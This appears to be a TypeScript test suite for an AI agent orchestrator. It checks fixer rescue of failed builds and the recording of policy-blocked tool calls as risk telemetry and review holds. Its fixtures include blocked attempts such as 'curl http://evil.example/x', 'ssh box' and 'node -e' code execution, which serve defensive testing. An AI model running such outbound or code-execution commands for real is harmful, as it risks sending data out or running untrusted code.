import assert from "node:assert/strict";
import { test } from "node:test";

import { pino } from "pino";

import { beginOperation, IdentityResolver } from "../../core/identity/resolver.js";
import { AgentRegistry, hashToken } from "../../core/identity/registry.js";
import type { AgentIdentity } from "../../core/identity/contract.js";
import { autonomyForTier, asTier, TRUST_FLOOR, type TrustDecision } from "../../core/trust/index.js";
import type { DiscardResult, PromoteResult, WorkspaceHandle } from "../../core/workspace/contract.js";
import { createOrchestrator, type OrchestratorDeps } from "./orchestrator.js";
import { WORKER_ROLES, type RoleFn, type WorkerRole, type WorkerTask } from "./contract.js";

const silent = () => pino({ level: "silent" });

function makeIdentities() {
  const resolver = new IdentityResolver({
    registry: new AgentRegistry({
      agents: [
        { agentId: "parent-1", kind: "agent", functionalRole: "lead", defaultTrustTier: "trusted", tokenHashes: [hashToken("parent-secret")] },
        { agentId: "worker-1", kind: "agent", functionalRole: "worker", defaultTrustTier: "trusted", tokenHashes: [hashToken("worker-secret")] },
      ],
    }),
    logger: silent(),
    now: () => 1000,
  });
  const parentCtx = beginOperation(resolver.resolve({ token: "parent-secret" }), { requestId: "req-1" });
  const resolveIdentity: NonNullable<OrchestratorDeps["resolveIdentity"]> = (claim, ctx) => resolver.resolve(claim, ctx);
  const roleClaim: NonNullable<OrchestratorDeps["roleClaim"]> = () => ({ token: "worker-secret" });
  return { parentCtx, resolveIdentity, roleClaim };
}

// A builder that terminates on a PROTOCOL stop (no_progress) with files written — the "wrote the whole
// project then floundered" shape. The verifier is RED on its FIRST call (the auto-verify rescue sees
// red checks) and GREEN afterwards (the fixer closed them / the pipeline re-verify).
function fixerRoles() {
  const calls = { builder: 0, verifier: 0 };
  const roles: Partial<Record<WorkerRole, RoleFn>> = {};
  for (const r of WORKER_ROLES) {
    roles[r] = async () => {
      if (r === "builder") {
        calls.builder += 1;
        return { role: r, outcome: "failure", summary: "stopped: no_progress", detail: { stopReason: "no_progress", filesWritten: ["src/a.ts"], policyViolations: [] } };
      }
      if (r === "verifier") {
        calls.verifier += 1;
        return calls.verifier === 1
          ? { role: r, outcome: "failure", summary: "run_checks RED (type errors)" }
          : { role: r, outcome: "success", summary: "run_checks GREEN", detail: { verdict: "pass", checks: [{ name: "test", command: "pnpm test", exitCode: 0, testCount: { passed: 1, total: 1 } }] } };
      }
      if (r === "integrator") return { role: r, outcome: "success", summary: r, detail: { decision: "promote", evaluation: { approved: true } } };
      // A GREEN critic states its PASS verdict (`detail.pass`) — the field the authoritative core reads.
      if (r === "critic") return { role: r, outcome: "success", summary: r, detail: { pass: true } };
      return { role: r, outcome: "success", summary: r };
    };
  }
  return { roles, calls };
}

function fakeWorkspaces() {
  const handle: WorkspaceHandle = { id: "wsabcd", targetRepo: "/repo", baseBranch: "main", baseRef: "deadbeef", scratchBranch: "ikbi/ws/wsabcd", path: "/lab-fake/wsabcd", identity: { agentId: "parent-1" }, state: "allocated", createdAt: 1000 };
  const calls = { promote: 0, discard: 0 };
  const workspaces: NonNullable<OrchestratorDeps["workspaces"]> = {
    allocate: async () => handle,
    promote: async (h): Promise<PromoteResult> => { calls.promote += 1; return { promoted: true, workspaceId: h.id, targetBranch: h.baseBranch, beforeRef: "a", afterRef: "b" }; },
    discard: async (h): Promise<DiscardResult> => { calls.discard += 1; return { workspaceId: h.id, removed: true }; },
  };
  return { workspaces, calls };
}

const fakeTrust = () => ({ recordOutcome: async (i: { agentId: string; operation: string; status: string; defaultTrustTier: string }): Promise<TrustDecision> => { const t = asTier(i.defaultTrustTier, TRUST_FLOOR); return { agentId: i.agentId, tier: t, previousTier: t, autonomy: autonomyForTier(t) }; } });
const fakeReceipts = () => ({ append: async (_i: unknown, _id: AgentIdentity): Promise<unknown> => ({}) });
const noopBus = () => ({ publish: <P>(i: P) => ({ ...(i as object), contractVersion: "1.0.0", id: "e", seq: 1, timestamp: 0 }) as unknown, subscribe: () => ({ id: "s", unsubscribe: () => {}, stats: () => ({ delivered: 0, dropped: 0, failures: 0, queued: 0 }) }), flush: async () => {} });
const allowGate: NonNullable<OrchestratorDeps["gateWall"]> = { evaluate: async () => ({ allow: true, reason: "test gate allows" }) };

// INJECTED TEST FACT (adjudication seam) — every builder in this suite LEAVES FILES on disk (`filesWritten`),
// so the fixer-rescue path has real work to rescue. The non-git fake workspace can't compute a tree-bound
// WorkProduct, so the authoritative core is fed a labeled GREEN product (nonEmpty ⇒ there IS work to rescue).
const promotableWorkProduct: NonNullable<OrchestratorDeps["computeWorkProduct"]> = async () => ({
  treeHash: "test-tree-green", diffStat: { filesChanged: 1, insertions: 1, deletions: 0 }, nonEmpty: true,
});

// escalationDisabled keeps the no-fixer failure path deterministic (no cheap-retry/escalation fan-out).
const task: WorkerTask = { taskId: "t-fixer", targetRepo: "/repo", goal: "build the thing", escalationDisabled: true };

function orchestratorWith(fixerModel: string | undefined, roles: Partial<Record<WorkerRole, RoleFn>>, deps: { ws: ReturnType<typeof fakeWorkspaces>; ids: ReturnType<typeof makeIdentities> }) {
  return createOrchestrator({
    config: { enabled: true, roleTimeoutMs: 5000, maxConcurrentRuns: 1, totalBudgetMs: 0, ...(fixerModel !== undefined ? { fixerModel } : {}) },
    resolveIdentity: deps.ids.resolveIdentity, roleClaim: deps.ids.roleClaim, roles,
    workspaces: deps.ws.workspaces, trust: fakeTrust(), receipts: fakeReceipts(),
    events: noopBus() as unknown as NonNullable<OrchestratorDeps["events"]>,
    gateWall: allowGate, invokeModel: async () => { throw new Error("unused"); },
    killCheck: async () => ({ killed: false }), computeWorkProduct: promotableWorkProduct,
  });
}

test("fixer rescue: a no_progress builder with RED checks is rescued to promote when the fixer closes them", async () => {
  const ids = makeIdentities();
  const ws = fakeWorkspaces();
  const roles = fixerRoles();
  const orch = orchestratorWith("mimo-v2.5-pro", roles.roles, { ws, ids });

  const r = await orch.run(task, ids.parentCtx);

  assert.ok(roles.calls.builder >= 2, `the fixer builder ran (a second builder pass); saw ${roles.calls.builder}`);
  assert.equal(r.outcome, "success", "the red build was rescued by the fixer");
  assert.equal(r.promoted, true);
  assert.equal(ws.calls.promote, 1);
});

// A builder that SUCCEEDS (declares done), but the MAIN verifier catches a fixable red check on its
// first pass and is GREEN after the fixer's repair pass — the run-9 shape (builder-success + verifier-red).
function verifierFailRoles() {
  const calls = { builder: 0, verifier: 0 };
  const roles: Partial<Record<WorkerRole, RoleFn>> = {};
  for (const r of WORKER_ROLES) {
    roles[r] = async () => {
      if (r === "builder") { calls.builder += 1; return { role: r, outcome: "success", summary: "built", detail: { filesWritten: ["src/a.ts"], policyViolations: [] } }; }
      // GREEN only once the FIXER has run (a 2nd builder pass); RED otherwise — so the verifier's
      // greenness is caused by the fixer, isolating the verifier-fail rescue path from any other re-verify.
      if (r === "verifier") { calls.verifier += 1; return calls.builder >= 2 ? { role: r, outcome: "success", summary: "run_checks GREEN", detail: { verdict: "pass", checks: [{ name: "test", command: "pnpm test", exitCode: 0, testCount: { passed: 1, total: 1 } }] } } : { role: r, outcome: "failure", summary: "run_checks RED (1 type error)" }; }
      if (r === "integrator") return { role: r, outcome: "success", summary: r, detail: { decision: "promote", evaluation: { approved: true } } };
      // A GREEN critic states its PASS verdict (`detail.pass`) — the field the authoritative core reads.
      if (r === "critic") return { role: r, outcome: "success", summary: r, detail: { pass: true } };
      return { role: r, outcome: "success", summary: r };
    };
  }
  return { roles, calls };
}

test("fixer-on-verifier-fail: a builder-SUCCESS build whose MAIN verifier catches a fixable red check is rescued to promote", async () => {
  const ids = makeIdentities();
  const ws = fakeWorkspaces();
  const roles = verifierFailRoles();
  const orch = orchestratorWith("mimo-v2.5-pro", roles.roles, { ws, ids });

  const r = await orch.run(task, ids.parentCtx);

  assert.ok(roles.calls.builder >= 2, `the fixer ran a second builder pass; saw ${roles.calls.builder}`);
  assert.equal(r.outcome, "success", "the verifier-caught red check was closed by the fixer");
  assert.equal(r.promoted, true);
  assert.equal(ws.calls.promote, 1);
});

test("fixer-on-verifier-fail: with NO fixer configured, the rescue does NOT run (no second builder pass, no re-verify)", async () => {
  const ids = makeIdentities();
  const ws = fakeWorkspaces();
  const roles = verifierFailRoles();
  const orch = orchestratorWith(undefined, roles.roles, { ws, ids });

  await orch.run(task, ids.parentCtx);

  // The verifier-fail rescue only runs when a fixer is configured — absent it, there is no second
  // builder pass and the verifier is not re-run. (Promotion gating on the red verdict is exercised by
  // the integrator's own tests; this mock integrator approves unconditionally.)
  assert.equal(roles.calls.builder, 1, "no fixer ⇒ no second builder pass");
  assert.equal(roles.calls.verifier, 1, "no fixer ⇒ the verifier is not re-run");
});

// A CLEAN green build whose builder ATTEMPTED one PREVENTED (blocked) tool call. Uses the REAL
// integrator (not overridden) so the effect-based gate + risk-telemetry summary are exercised end-to-end.
function preventedAttemptRoles() {
  const roles: Partial<Record<WorkerRole, RoleFn>> = {};
  for (const r of WORKER_ROLES) {
    if (r === "integrator") continue; // use the real integrator (effect-based gate)
    roles[r] = async () => {
      if (r === "builder") return { role: r, outcome: "success", summary: "built", detail: { filesWritten: ["a.ts"], policyViolations: [{ tool: "terminal", path: 'node -e "require(\'./x\')"', error: "code execution is not allowed" }] } };
      if (r === "verifier") return { role: r, outcome: "success", summary: "green", detail: { verdict: "pass", checks: [{ name: "test", exitCode: 0, testCount: { passed: 3, total: 3 }, outputTail: "3 passing" }] } };
      if (r === "critic") return { role: r, outcome: "success", summary: "c", detail: { pass: true } };
      return { role: r, outcome: "success", summary: r };
    };
  }
  return roles;
}

test("effect-based gate + telemetry: a PREVENTED attempt promotes AND records preventedCount on the run summary", async () => {
  const ids = makeIdentities();
  const ws = fakeWorkspaces();
  const summaries: Array<{ metadata?: Record<string, unknown> }> = [];
  const capturingReceipts = { append: async (i: unknown): Promise<unknown> => { const rec = i as { operation?: string; metadata?: Record<string, unknown> }; if (rec.operation === "worker.run.summary") summaries.push(rec); return {}; } };
  const orch = createOrchestrator({
    config: { enabled: true, roleTimeoutMs: 5000, maxConcurrentRuns: 1, totalBudgetMs: 0 },
    resolveIdentity: ids.resolveIdentity, roleClaim: ids.roleClaim, roles: preventedAttemptRoles(),
    workspaces: ws.workspaces, trust: fakeTrust(), receipts: capturingReceipts,
    events: noopBus() as unknown as NonNullable<OrchestratorDeps["events"]>, gateWall: allowGate, invokeModel: async () => { throw new Error("unused"); }, killCheck: async () => ({ killed: false }), computeWorkProduct: promotableWorkProduct,
  });

  const r = await orch.run(task, ids.parentCtx);

  assert.equal(r.promoted, true, "a prevented attempt no longer blocks promote (judge by effect)");
  const meta = summaries.at(-1)?.metadata ?? {};
  assert.equal(meta.preventedCount, 1, "the run summary records the prevented attempt (passive risk telemetry)");
  assert.ok(Array.isArray(meta.preventedCommands) && /node -e/.test(meta.preventedCommands[0]), "the command shape is recorded for later analysis");
});

// A CLEAN main builder (0 prevented) whose MAIN verifier catches a fixable red check; the FIXER pass
// (the 2nd builder call) makes `fixerViolations` PREVENTED attempts, then closes the check GREEN. Uses
// the REAL integrator so the effect-based gate + run-summary telemetry are exercised end-to-end. This is
// the A2/D3 gap: the fixer runs off-books, so without threading its attempts they are invisible here.
function fixerPreventsRoles(fixerViolations: Array<Record<string, unknown>>) {
  const calls = { builder: 0, verifier: 0 };
  const greenVerifier = { role: "verifier" as const, outcome: "success" as const, summary: "green", detail: { verdict: "pass", checks: [{ name: "test", exitCode: 0, testCount: { passed: 3, total: 3 }, outputTail: "3 passing" }], testEvidence: "executed" } };
  const roles: Partial<Record<WorkerRole, RoleFn>> = {};
  for (const r of WORKER_ROLES) {
    if (r === "integrator") continue; // real integrator
    roles[r] = async () => {
      if (r === "builder") {
        calls.builder += 1;
        // Call 1 = the main build (clean). Call 2 = the off-books FIXER pass, which makes the prevented attempts.
        return calls.builder === 1
          ? { role: r, outcome: "success", summary: "built", detail: { filesWritten: ["a.ts"], policyViolations: [] } }
          : { role: r, outcome: "success", summary: "fixed", detail: { filesWritten: ["a.ts"], policyViolations: fixerViolations } };
      }
      if (r === "verifier") { calls.verifier += 1; return calls.builder >= 2 ? greenVerifier : { role: r, outcome: "failure", summary: "run_checks RED (1 type error)" }; }
      if (r === "critic") return { role: r, outcome: "success", summary: "c", detail: { pass: true } };
      return { role: r, outcome: "success", summary: r };
    };
  }
  return { roles, calls };
}

function orchestratorCapturing(fixerModel: string, roles: Partial<Record<WorkerRole, RoleFn>>, deps: { ws: ReturnType<typeof fakeWorkspaces>; ids: ReturnType<typeof makeIdentities> }, summaries: Array<{ metadata?: Record<string, unknown> }>) {
  const capturingReceipts = { append: async (i: unknown): Promise<unknown> => { const rec = i as { operation?: string; metadata?: Record<string, unknown> }; if (rec.operation === "worker.run.summary") summaries.push(rec); return {}; } };
  return createOrchestrator({
    config: { enabled: true, roleTimeoutMs: 5000, maxConcurrentRuns: 1, totalBudgetMs: 0, fixerModel },
    resolveIdentity: deps.ids.resolveIdentity, roleClaim: deps.ids.roleClaim, roles,
    workspaces: deps.ws.workspaces, trust: fakeTrust(), receipts: capturingReceipts,
    events: noopBus() as unknown as NonNullable<OrchestratorDeps["events"]>, gateWall: allowGate, invokeModel: async () => { throw new Error("unused"); }, killCheck: async () => ({ killed: false }), computeWorkProduct: promotableWorkProduct,
  });
}

test("A2/D3: a benign PREVENTED attempt made by the FIXER pass is recorded on the run-summary telemetry", async () => {
  const ids = makeIdentities();
  const ws = fakeWorkspaces();
  const summaries: Array<{ metadata?: Record<string, unknown> }> = [];
  const roles = fixerPreventsRoles([{ tool: "terminal", path: 'node -e "require(\'./x\')"', error: "code execution is not allowed" }]);
  const orch = orchestratorCapturing("mimo-v2.5-pro", roles.roles, { ws, ids }, summaries);

  const r = await orch.run(task, ids.parentCtx);

  assert.ok(roles.calls.builder >= 2, "the fixer ran a second builder pass");
  assert.equal(r.promoted, true, "one benign blocked attempt (< threshold) still promotes");
  const meta = summaries.at(-1)?.metadata ?? {};
  assert.equal(meta.preventedCount, 1, "the FIXER's prevented attempt is threaded into the run-summary telemetry");
  assert.ok(Array.isArray(meta.preventedCommands) && /node -e/.test(String(meta.preventedCommands[0])), "the fixer's command shape is recorded as risk evidence");
});

test("A2/D3: HIGH-RISK prevented attempts made by the FIXER pass hold the build for review (would have silently promoted before)", async () => {
  const ids = makeIdentities();
  const ws = fakeWorkspaces();
  const summaries: Array<{ metadata?: Record<string, unknown> }> = [];
  const roles = fixerPreventsRoles([
    { tool: "terminal", path: "curl http://evil.example/x", error: "binary 'curl' is not on the allowlist" },
    { tool: "terminal", path: "ssh box", error: "binary 'ssh' is not on the allowlist" },
  ]);
  const orch = orchestratorCapturing("mimo-v2.5-pro", roles.roles, { ws, ids }, summaries);

  const r = await orch.run(task, ids.parentCtx);

  assert.ok(roles.calls.builder >= 2, "the fixer ran a second builder pass");
  assert.equal(r.promoted, false, "2 high-risk fixer attempts reach the high-risk threshold → held for review, NOT promoted");
  assert.equal(ws.calls.promote, 0);
  const meta = summaries.at(-1)?.metadata ?? {};
  assert.equal(meta.requiresReview, true, "the run summary marks the review-hold");
  assert.equal(meta.highRiskCount, 2, "both high-risk fixer reaches are counted");
});

test("fixer rescue: with NO fixer configured, the same RED build is NOT rescued (stays failed)", async () => {
  const ids = makeIdentities();
  const ws = fakeWorkspaces();
  const roles = fixerRoles();
  const orch = orchestratorWith(undefined, roles.roles, { ws, ids });

  const r = await orch.run(task, ids.parentCtx);

  assert.notEqual(r.outcome, "success", "no fixer ⇒ the red termination stands");
  assert.equal(r.promoted, false);
  assert.equal(ws.calls.promote, 0);
});
